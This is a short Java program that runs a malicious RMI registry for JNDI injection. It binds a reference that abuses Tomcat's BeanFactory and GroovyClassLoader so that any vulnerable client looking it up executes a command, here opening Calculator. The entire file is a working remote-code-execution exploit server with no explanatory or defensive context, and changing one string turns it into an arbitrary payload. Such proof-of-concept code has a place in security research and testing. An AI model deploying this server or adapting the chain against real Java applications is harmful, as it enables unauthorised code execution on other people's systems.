package com.zbz;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;



public class GroovyShellServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = "@groovy.transform.ASTTest(value={\n" +
                "    assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")\n" +
                "})\n" +
                "def x\n";
        ref.add(new StringRefAddr("x",script));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("evilGroovy", referenceWrapper);
    }
}